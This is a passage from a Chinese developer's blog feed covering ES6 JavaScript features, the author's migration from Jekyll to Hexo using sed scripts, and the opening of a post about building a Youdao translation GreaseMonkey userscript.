<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">OPERATOR = <span class="regexp">/// ^ (</span><br><span class="line">  ?: [-=]&gt;             <span class="comment"># function</span></span><br><span class="line">   | [-+*/%&lt;&gt;&amp;|^!?=]=  <span class="comment"># compound assign / compare</span></span><br><span class="line">   | &gt;&gt;&gt;=?             <span class="comment"># zero-fill right shift</span></span><br><span class="line">   | ([-+:])\1         <span class="comment"># doubles</span></span><br><span class="line">   | ([&amp;|&lt;&gt;])\2=?      <span class="comment"># logic / shift</span></span><br><span class="line">   | \?\.              <span class="comment"># soak access</span></span><br><span class="line">   | \.&#123;2,3&#125;           <span class="comment"># range or splat</span></span><br><span class="line">) ///</span></span><br></pre></td></tr></table></figure>
<p>非常方便不是？虽然我开始是在<a href="www.nltk.org/book/ch03.html">nltk</a>中看到了这个功能，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="string">'That U.S.A. poster-print costs $12.40...'</span></span><br><span class="line">pattern = <span class="string">r'''(?x)    # set flag to allow verbose regexps</span><br><span class="line">    ([A-Z]\.)+        # abbreviations, e.g. U.S.A.</span><br><span class="line">  | \w+(-\w+)*        # words with optional internal hyphens</span><br><span class="line">  | \$?\d+(\.\d+)?%?  # currency and percentages, e.g. $12.40, 82%</span><br><span class="line">  | \.\.\.            # ellipsis</span><br><span class="line">  | [][.,;"'?():-_`]  # these are separate tokens;</span><br><span class="line">'''</span></span><br><span class="line">nltk.regexp_tokenize(text, pattern)</span><br><span class="line">[<span class="string">'That'</span>, <span class="string">'U.S.A.'</span>, <span class="string">'poster-print'</span>, <span class="string">'costs'</span>, <span class="string">'$12.40'</span>, <span class="string">'...'</span>]</span><br></pre></td></tr></table></figure>
<p>想了想如何在js中自己实现，忽然想到了template string这个特性。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params">strings</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> returnS;</span><br><span class="line">  <span class="comment">// remove all space;</span></span><br><span class="line">  returnS = strings[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">let</span> comment = <span class="regexp">/\/\/.*\n/g</span>;</span><br><span class="line">  returnS = returnS.replace(comment, <span class="string">""</span>);</span><br><span class="line">  returnS = returnS.replace(<span class="regexp">/\s+/g</span>,<span class="string">""</span>);</span><br><span class="line">  <span class="keyword">return</span> returnS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r<span class="string">`</span><br><span class="line">    ([A-Z]\.)+        // abbreviations, e.g. U.S.A.</span><br><span class="line">  | \w+(-\w+)*        // words with optional internal hyphens</span><br><span class="line">  | \$?\d+(\.\d+)?%?  // currency and percentages, e.g. $12.40, 82%</span><br><span class="line">  | \.\.\.            // ellipsis</span><br><span class="line">  | [][.,;"'?():-_\`] // these are separate tokens; includes ], [</span><br><span class="line">`</span></span><br></pre></td></tr></table></figure>
<p>这里用到了<a href="http://devdocs.io/javascript/template_strings" target="_blank" rel="external">Tagged template strings</a>的特性。</p>
<p>另外，如果是多行连续文本时也应该使用template string。</p>
<h2 id="class">class</h2><p>从本质上讲，javascript中的所有面向对象机制都是建构在原型链上的，但class这种语法糖也能比较方便。在coffeescript中我觉得那种浓烈ruby风的写法更合心意一些，<code>class</code>关键字总有些不怎么顺手的地方，比如 <em>设置类静态变量</em> 和有争议的 <em>mixin</em> 。参照nltk wordnet corpus reader类的时候也简单实践了下class关键字、继承等的使用。简单使用还是挺顺手的。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Synset</span> <span class="keyword">extends</span> <span class="title">_WordNetObject</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* lemma.pos.number to get a synset */</span></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    <span class="comment">// initialized by the Reader</span></span><br><span class="line">    <span class="keyword">this</span>._name = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">this</span>._offset = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">this</span>._lexname = <span class="literal">null</span>; <span class="comment">// lexicographer file e.g. noun.animal</span></span><br><span class="line">    <span class="keyword">this</span>._pos = <span class="literal">null</span>;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<h2 id="destructuring_assign">destructuring assign</h2><p>这是，非常好用的语法糖。终于可以</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[a, b] = [<span class="number">1</span>, <span class="number">2</span>];</span><br></pre></td></tr></table></figure>
<h2 id="Spread_Operator">Spread Operator</h2><p>各种语法糖，处理rest parameter时省心很多，而且返回的是一个真正的Array对象。比较有意思的一个例子是，有次见有人讨论如何把<code>Math.min</code>应用到数组上。他说到javascript高级程序设计上的例子：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">min</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.min.apply(<span class="built_in">Math</span>, array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>认为应该把<code>this</code>绑定到<code>null</code>而不是<code>Math</code>，于是我才知道<code>apply</code>时还是要小心不要污染全局变量空间。。。不过这个例子，我去翻了下<a href="https://github.com/v8/v8/blob/44c44521ae11859478b42004f57ea93df52526ee/src/js/math.js#L110-135" target="_blank" rel="external">v8的math.js</a>和<a href="https://github.com/ricardoquesada/Spidermonkey/blob/master/js/src/jsmath.cpp#L593-L616" target="_blank" rel="external">spidermonkey的Math实现</a>，都不关this什么事，所以，我觉得，爱绑定啥都行。。。</p>
<p>关键在于，有了spread operator之后</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Math</span>.min(...array);</span><br></pre></td></tr></table></figure>
<p>就行了。这些类似的应用场景很多的，比如打印数组中每个成员</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(...array);</span><br></pre></td></tr></table></figure>
<p>少写多少代码：）</p>
<h2 id="Arrow_Function">Arrow Function</h2><p>在前面的例子中你应该已经见到过，箭头函数让书写匿名函数(lambda)变得异常方便(少打很多字)，除了不能用箭头函数写一个generator这个设定有些意外。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(v=&gt;v+<span class="number">1</span>)(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p>另外，箭头函数的this是提前绑定到所在词法作用域内的(和调用者无关、apply等指定的<code>this</code>都无关)，有兴趣的同学大概可以去看看v8和SpiderMonkey怎么实现的。</p>
<h2 id="Proxy">Proxy</h2><p>差点忘了这个，因为，目前，截至到本文发稿，v8并不支持标准中的新特性(<code>--harmony_proxies</code>开启的是已废弃的Proxy API)，所以node也不支持。firefox倒是支持非常好哈哈。</p>
<p>在python中，标准库中有个较<code>defaultdict</code>的东西。有什么作用看看下面的例子就知道了。事实上，nltk wordnet corpus reader生成映射的时候很依赖这个功能。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In [3]: from collections import defaultdict</span><br><span class="line"></span><br><span class="line">In [4]: expanded_dict = defaultdict(dict)</span><br><span class="line"></span><br><span class="line">In [5]: expanded_dict['a']['b'] = 1</span><br><span class="line"></span><br><span class="line">In [6]: expanded_dict</span><br><span class="line">Out[6]: defaultdict(&lt;type 'dict'&gt;, &#123;'a': &#123;'b': 1&#125;&#125;)</span><br><span class="line"></span><br><span class="line">In [7]: dict['a']['b']</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">TypeError                                 Traceback (most recent call last)</span><br><span class="line">&lt;ipython-input-7-07dd2e624242&gt; in &lt;module&gt;()</span><br><span class="line">----&gt; 1 dict['a']['b']</span><br><span class="line"></span><br><span class="line">TypeError: 'type' object has no attribute '__getitem__'</span><br></pre></td></tr></table></figure>
<p>显然我们不想让不存在的东西报错，我们也不想每次都写个if语句判断是吧。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> dct[<span class="string">'a'</span>]:</span><br><span class="line">    dct[<span class="string">'a'</span>] = &#123;&#125;</span><br><span class="line">dct[<span class="string">'a'</span>][<span class="string">'b'</span>] = <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>如果你知道<code>dct</code>中有哪些键当然也能全首先赋成字典，但是，很多情况下你并不知道有哪些键，还得依靠if来判断。<code>defaultdict</code>优雅的解决了这个问题。</p>
<p>遗憾的是，javascript中没有这种东西。忽然想到了<a href="https://hacks.mozilla.org/2015/07/es6-in-depth-proxies-and-reflect/" target="_blank" rel="external">ES6 in Depth: Proxies</a>中的例子，想到可以依靠这个特性自己实现一个<code>defaultdict</code>。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Defaultdict</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  handler = &#123;</span><br><span class="line">    get: <span class="function"><span class="keyword">function</span> (<span class="params">target, prop, receiver</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (!(prop <span class="keyword">in</span> target)) &#123;</span><br><span class="line">        target[prop] = &#123;&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> target[prop];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> p = <span class="keyword">new</span> <span class="built_in">Proxy</span>(<span class="keyword">this</span>, handler);</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> expandedDct = <span class="keyword">new</span> Defaultdict();</span><br><span class="line">expandedDct.a.b = <span class="number">1</span>;</span><br><span class="line">expandedDct.c.d = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log(expandedDct.a.b)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.keys(expandedDct));</span><br></pre></td></tr></table></figure>
<p>目前只有firefox支持标准的Proxy API。当然V8/node中可以polyfill出来，请自行github。</p>
<p>用<code>Proxy</code>可以结合<code>Map</code>来实现<code>Map</code>版本的DefaultMap哈哈。</p>
<p></p><p style="color:red">PS: 浏览器调试工具会调用一些方法。比如，你新建一个<code>expandedDct</code>之后，如果在firebug中想用<code>.</code>来查看变量，会对其调用很多方法。。。结果就是<code>expandedDct</code>多了很多firebug探查对象属性用到的函数名。。。我在这个问题上纠结了几乎两个小时没明白为啥多了这些奇怪的键而且一会儿有一会儿没。切切注意！！</p><p></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#62; Object.keys(expandedDct)&#10;[&#34;a&#34;, &#34;c&#34;, &#34;length&#34;, &#34;fullPath&#34;, &#34;fileSize&#34;, &#34;header&#34;, &#34;body&#34;, &#34;getSourceLink&#34;]</span><br></pre></td></tr></table></figure>
<h2 id="总结">总结</h2><p>以上，就是最近感觉比较有意思的一些ES6特性，就这样吧。</p>
<p>Have fun！</p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="ES6">ES6</h2><p>ES6标准，也称ES2015。在2015年6月正式批准，这是javascript语言标准从2009年首次大版本更新。</p>
<p>这个版本带来了很多新东西，说是新东西，估计基本读者也都见过。比如python中常用的Destruct]]>
    </summary>
    
      <category term="ES2015" scheme="http://reverland.org/tags/es2015/"/>
    
      <category term="javascript" scheme="http://reverland.org/tags/javascript/"/>
    
      <category term="javascript" scheme="http://reverland.org/categories/javascript/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[从Jekyll迁移到Hexo]]></title>
    <link href="http://reverland.org/web/2015/11/18/notes-on-migrating-from-jeykll-to-hexo/"/>
    <id>http://reverland.org/web/2015/11/18/notes-on-migrating-from-jeykll-to-hexo/</id>
    <published>2015-11-17T16:00:00.000Z</published>
    <updated>2015-11-18T15:23:54.682Z</updated>
    <content type="html"><![CDATA[<p>上周，我将博客从jekyll平台迁移到hexo下。</p>
<h2 id="缘起">缘起</h2><p>不为什么。本来不想换，奈何不能成功在ubuntu 14.10上用rvm成功编译<code>ruby 2.1+</code>，连续几次过热自动关机后，就默默装上了基于node的hexo。</p>
<h2 id="迁移记录">迁移记录</h2><p>对jekyll，日志源文件都在<code>_posts/</code>目录下。而hexo则在<code>sources/_posts/</code>下。两者支持的都是带metadata的markdown文件。(当然，我还有一些用textile标记的文件。)简单来说，只要把相应的markdown文件迁移到hexo对应的位置就行。</p>
<p>但在迁移碰到了几个问题：</p>
<ol>
<li>修正permalink</li>
<li>语法高亮部分修改</li>
<li>特殊字符escape</li>
<li>textile文件</li>
</ol>
<h3 id="与jekyll之前配置一致的url结构和文件命名方式">与jekyll之前配置一致的url结构和文件命名方式</h3><p>以前，我用jeykll时，每个文件名字如下：</p>
<pre><code><span class="number">2012</span>-<span class="number">11</span>-<span class="number">19</span>-<span class="keyword">this</span>-is-a-post.md
</code></pre><p>对应的url为</p>
<pre><code><span class="string">http:</span><span class="comment">//reverland.org/2012/11/19/this-is-a-post/</span>
</code></pre><p>或者可以是</p>
<pre><code><span class="string">http:</span><span class="comment">//reverland.org/2012/11/19/this-is-a-post</span>
<span class="string">http:</span><span class="comment">//reverland.org/2012/11/19/this-is-a-post/index.html</span>
</code></pre><p>首先，要把hexo也改成这样的，在<code>_config.yml</code>中：</p>
<pre><code><span class="symbol">new_post_name:</span> <span class="symbol">:year-</span><span class="symbol">:month-</span><span class="symbol">:day-</span><span class="symbol">:title</span>.md <span class="comment"># File name of new posts</span>
<span class="symbol">permalink:</span> <span class="symbol">:category/</span><span class="symbol">:year/</span><span class="symbol">:month/</span><span class="symbol">:day/</span><span class="symbol">:title/</span>
</code></pre><p>但，还是有问题，具体可以参照<a href="https://github.com/hexojs/hexo/issues/1589" target="_blank" rel="external">我提的issue</a>，hexo如果看你的文件名是这样：</p>
<pre><code><span class="number">2014</span>-<span class="number">06</span>-<span class="number">12</span>-.md
</code></pre><p>会生成这样的url</p>
<pre><code><span class="number">2015</span>/<span class="number">11</span>/<span class="number">13</span>/<span class="number">2014</span>-<span class="number">06</span>-<span class="number">12.</span>html
</code></pre><p>显然这不是我们想要的。</p>
<p>我们通过将<a href="https://github.com/hexojs/hexo-util/blob/cb685f19ecb5ba9ee48109049b21a21cd3da7dee/lib/permalink.js#L28" target="_blank" rel="external"><code>node_modules/hexo-util/lib/permalink.js</code>第28行</a>由</p>
<pre><code><span class="keyword">return</span> <span class="string">'(.+?)'</span>;
</code></pre><p>更改为</p>
<pre><code><span class="keyword">return</span> <span class="string">'(.*?)'</span>;
</code></pre><p>可以实现以前的jekyll风格。</p>
<p>如果你现在用的是hexo版本<code>3.1.0</code>，如果文件是：</p>
<p>可能会遇到生成这种url链接：</p>
<pre><code><span class="label">http:</span>//reverland<span class="preprocessor">.org</span>/<span class="number">2014</span>/<span class="number">06</span>/<span class="number">12</span>//index.html
<span class="label">http:</span>//reverland<span class="preprocessor">.org</span>/<span class="number">2014</span>/<span class="number">06</span>/<span class="number">12</span>//
</code></pre><p>在github中hexo已经不会有这个问题了，可以参见 <a href="https://github.com/hexojs/hexo/blob/d035d19ccd221f6815634c2d6d2aaa59b959839f/lib/plugins/helper/url_for.js#L30" target="_blank" rel="external">hexo/helper/url_for</a>的</p>
<pre><code><span class="function"><span class="keyword">return</span> path.<span class="title">replace</span><span class="params">(/\/{<span class="number">2</span>,}/g, <span class="string">'/'</span>)</span></span>;
</code></pre><p>来进行修改，如果你用的不是git版本的hexo。</p>
<p>我之后还碰到个问题，hexo中的分类是大小写敏感的，jekyll也是，但jekyll在url中会统一变成小写而hexo则不会，这竟然造成了我迁移后的一些链接失效。修正方法也很简单，通过<code>sed</code>将所有大写的<code>category</code>项都替换成对应的小写版本。</p>
<pre><code><span class="title">sed</span> -i <span class="string">'s/^category: Life/category: life/g'</span> source/_posts/<span class="regexp">*.md</span>  <span class="comment"># 我只有Life分类莫名写成了大写</span>
</code></pre><p>这样，确保了和jekyll之前所有链接一致，然而，发现还是有disqus的评论消失了，检查链接并没有差异，暂时不知为什么。如果有谁能指教下请告诉我。</p>
<h3 id="语法高亮修改">语法高亮修改</h3><p>jekyll中，除了我用四个空格作为编码块区域缩进设定，还广泛使用了jekyll所特有的记法进行代码高亮。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% highlight python %&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#123;% endhighlight %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% highlight cl%&#125;</span><br><span class="line">(cdr,</span><br><span class="line">  (add,</span><br><span class="line">    <span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">&#123;% endhighlight %&#125;</span><br></pre></td></tr></table></figure>
<p>另外，我的每个文件里还有些jekyll特定命令来加入统计和评论什么的。这是当年从<a href="http://blog.skydark.info/" target="_blank" rel="external">Skydark</a>那里画虎不成留下的各种dirty　hack的结果。</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include JB/setup %&#125;</span><br></pre></td></tr></table></figure>
<p>可以这样转换掉</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">'s/&#123;%[[:space:]]highlight[[:space:]]\(.*\)[[:space:]]*%\&#125;/```\1/g'</span> <span class="built_in">source</span>/_posts/*.md  <span class="comment"># 注意有空格和没空格</span></span><br><span class="line">sed -i <span class="string">'s/&#123;%[[:space:]]endhighlight[[:space:]]%\&#125;/```/g'</span> <span class="built_in">source</span>/_posts/*.md</span><br><span class="line">sed -i <span class="string">'s/&#123;%[[:space:]]include JB\/setup[[:space:]]%\&#125;//g source/_posts/*.md'</span></span><br></pre></td></tr></table></figure>
<h3 id="特殊字符escape">特殊字符escape</h3><p>接着有些特殊的文件会解析报错，因为hexo<a href="https://hexo.io/docs/troubleshooting.html#Escape_Contents" target="_blank" rel="external">用nunjunks来渲染</a>，如果文本中有<code>{&#123; }}</code>或者<code>{&#37; %}</code>会出错。我发现如果是缩进四格的代码标记或者<code>&#96;</code>会出错，但如果用另一种标记法<code> &#96;&#96;&#96;</code>则没关系。</p>
<p>实在不行，我们可以用<a href="http://www.ascii.cl/htmlcodes.htm" target="_blank" rel="external">html实体编码</a>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;code&#62;&#38;#97;&#38;#98;&#38;#99;&#60;/code&#62;</span><br></pre></td></tr></table></figure>
<h3 id="textile文件">textile文件</h3><p>我试着用pandoc转换了下，发现几个问题：</p>
<ol>
<li>会将metadata错误地转换</li>
<li>莫名的在行或特殊符号后面加反斜杠</li>
<li>不能很好处理jekyll的代码高亮标记法</li>
</ol>
<p>我写了些脚本辅助手工更改为markdown格式。话说这些sed代码还都是之前尝试往pelican上迁移时写的辅助脚本，虽然从来没有迁移到pelican平台上。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除和转换jeykll特定标记</span></span><br><span class="line">sed -i <span class="string">'s/&#123;%[[:space:]]include JB\/setup[[:space:]]%\&#125;//g'</span> <span class="built_in">source</span>/_posts/*.textile</span><br><span class="line">sed -i <span class="string">'s/&#123;%[[:space:]]highlight[[:space:]]\(.*\)[[:space:]]*%\&#125;/```\1/g'</span> <span class="built_in">source</span>/_posts/*.textile</span><br><span class="line">sed -i <span class="string">'s/&#123;%[[:space:]]endhighlight[[:space:]]%\&#125;/```/g'</span> <span class="built_in">source</span>/_posts/*.textile</span><br><span class="line"></span><br><span class="line"><span class="comment"># textile标记到markdown的转换</span></span><br><span class="line"><span class="comment"># 列表</span></span><br><span class="line">sed -i <span class="string">'s/^* /- /g'</span> <span class="built_in">source</span>/_posts/*.textile</span><br><span class="line">sed -i <span class="string">'s/^# /- /g'</span> <span class="built_in">source</span>/_posts/*.textile</span><br><span class="line"><span class="comment"># 标题</span></span><br><span class="line">sed -i <span class="string">'s/^h1./#/g'</span> <span class="built_in">source</span>/_posts/*.textile</span><br><span class="line">sed -i <span class="string">'s/^h2./##/g'</span> <span class="built_in">source</span>/_posts/*.textile</span><br><span class="line">sed -i <span class="string">'s/^h3./###/g'</span> <span class="built_in">source</span>/_posts/*.textile</span><br><span class="line">sed -i <span class="string">'s/^h4./####/g'</span> <span class="built_in">source</span>/_posts/*.textile</span><br><span class="line">sed -i <span class="string">'s/^h5./#####/g'</span> <span class="built_in">source</span>/_posts/*.textile</span><br><span class="line"><span class="comment"># 脚注</span></span><br><span class="line">sed -i <span class="string">'s/^fn\([[:digit:]]\)\./[\^\1]:/g'</span> <span class="built_in">source</span>/*.textile</span><br><span class="line">sed -i <span class="string">'s/\[\([[:digit:]]*\)\]/[\^\1]/g'</span> <span class="built_in">source</span>/*.textile</span><br><span class="line"><span class="comment"># 默认的markdown解析并不支持脚注</span></span><br><span class="line"><span class="comment"># 如果需要，参考这里替换默认markdown解析，https://github.com/celsomiranda/hexo-renderer-markdown-it　</span></span><br><span class="line"><span class="comment"># 可惜这个引擎中，```块就不能正常解析&#123;&#123; &#125;&#125;这种东西了</span></span><br><span class="line"><span class="comment"># 不知道那个pandoc后端的怎样。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 链接</span></span><br><span class="line">sed -i <span class="string">'s/"\([^"]*\)"\([h|\/].*\)/[\1](\2)/g'</span> <span class="built_in">source</span>/*.textile</span><br><span class="line">sed -i <span class="string">'s/"\([^"]*\)"\([^h\/].*\)/[\1][\2]/g'</span> <span class="built_in">source</span>/*.textile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后把后缀改了，hexo不会处理后缀是textile的文件</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> <span class="built_in">source</span>/_posts/*.textile; <span class="keyword">do</span></span><br><span class="line">cp <span class="variable">$file</span> <span class="built_in">source</span>/_posts/`basename <span class="variable">$file</span> .textile`.md</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>当然，最好脚本辅助，手工确认。</p>
<p>另外，有这么个东西<a href="https://github.com/wzpan/hexo-renderer-pandoc" target="_blank" rel="external">hexo render pandoc</a>来替换hexo的渲染引擎，就能顺便支持textile。值得一试和研究，也许里头就用到对文档元数据或者跳过指定行数的转换吧。没有细看。话说，还看到<a href="http://codefalling.com/2015/11/15/new-version-of-hexo-renderer-org/" target="_blank" rel="external">@CodeFalling</a>使用emacs来做org渲染后端，hexo的灵活性可见一斑。</p>
<h2 id="feed">feed</h2><p>默认的hexo竟然不像jekyll一样有feed生成支持！不过有<a href="https://github.com/hexojs/hexo-generator-feed" target="_blank" rel="external">hexo-generator-feed</a>这个插件来实现。具体参照文档就好。</p>
<h2 id="添加友情链接、分类页、标签页">添加友情链接、分类页、标签页</h2><p>根据<a href="http://theme-next.iissnan.com/theme-settings.html" target="_blank" rel="external">根据Next主题的文档来就好</a>。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>上周，我将博客从jekyll平台迁移到hexo下。</p>
<h2 id="缘起">缘起</h2><p>不为什么。本来不想换，奈何不能成功在ubuntu 14.10上用rvm成功编译<code>ruby 2.1+</code>，连续几次过热自动关机后，就默默装上了基于nod]]>
    </summary>
    
      <category term="hexo" scheme="http://reverland.org/tags/hexo/"/>
    
      <category term="web" scheme="http://reverland.org/tags/web/"/>
    
      <category term="web" scheme="http://reverland.org/categories/web/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[GreaseMonkey Userscript 开发的难与易]]></title>
    <link href="http://reverland.org/javascript/2015/11/17/greasemonkey-userscript/"/>
    <id>http://reverland.org/javascript/2015/11/17/greasemonkey-userscript/</id>
    <published>2015-11-17T14:21:25.000Z</published>
    <updated>2015-11-24T16:42:08.801Z</updated>
    <content type="html"><![CDATA[<p>这两天，写了一个简单的基于有道在线翻译的GreaseMonkey屏幕取词脚本。</p>
<p><a href="https://greasyfork.org/en/scripts/12758-youdaodict" target="_blank" rel="external">点我查看GreaseFork</a></p>
<p><img src="http://img.vim-cn.com/6d/513d2b37bf298b4ae77bc663c597260e5a115e.gif" alt="有道取词Userscript"></p>
<p>我想做这件事很久了，从我还不是一个前端开发者的时候，就一直想做这么一个轻量的浏览器脚本，方便自己查看英文的文档和文章。没想到想了这么久，真正没做多久。</p>
<p>作为一个Ubuntu Linux用户，浏览器取词我有几个选择：</p>
<ol>
<li><p>尝试安装有道词典Linux版本、openyoudao或者其他stardict或者goldendict这种本地词典。但我并不觉得我需要桌面软件。</p>
</li>
<li><p>有人做了个Google translate tooltip的GreaseMonkey脚本实现这个，非常棒。但谷歌的服务在国内的服务非常不稳定，取词功能经常不能正常使用。</p>
</li>
<li><p>有道提供了<a href="http://fanyi.youdao.com/web2/?keyfrom=fanyiweb" target="_blank" rel="external">网页翻译2.0</a>，通过书签执行一段代码把取词功能注入当前页面。然而，首先随着浏览器安全特性的加强，该书签不能正常使用，其次每次都要先点书签才能取词(也许是快捷键)。</p>
</li>
</ol>
<h2 id="选择是难">选择是难</h2><p>很多网站，包括cnblog发现都提供了取词版本。我面临的选择是：</p>
<ol>
<li>在这些已有的浏览器取词脚本基础上学习修改。</li>
<li>凭借着自己的感觉从新设计</li>
</ol>
<p>选择上花了很多时间。</p>
<p>方案一的优点有：</p>
<ol>
<li>成熟美观。</li>
<li>能学习到很多东西</li>
</ol>
<p>方案一问题在于：</p>
<ol>
<li>源码难理解。代码量较大，都是压缩甚至混淆变量过的。</li>
<li>有些和当前页面的样式或者脚本搅和在一起。不易分离</li>
<li>被浏览器或网站安全设置废掉，未必能使用</li>
</ol>
<p>终于，由于我的智商被有道在线翻译那个脚本所碾压，我想还是看看功能自己设计下，做个简单版本。</p>
<p>想的很简单</p>
<h2 id="设计是易">设计是易</h2><p>想法很简单。</p>
<ol>
<li>鼠标选词</li>
<li>向第三方发起请求，比如bing的翻译或者有道的</li>
<li>读取返回，弹出tooltip，格式化数据</li>
<li>其他辅助功能比如发音、单词本等等</li>
</ol>
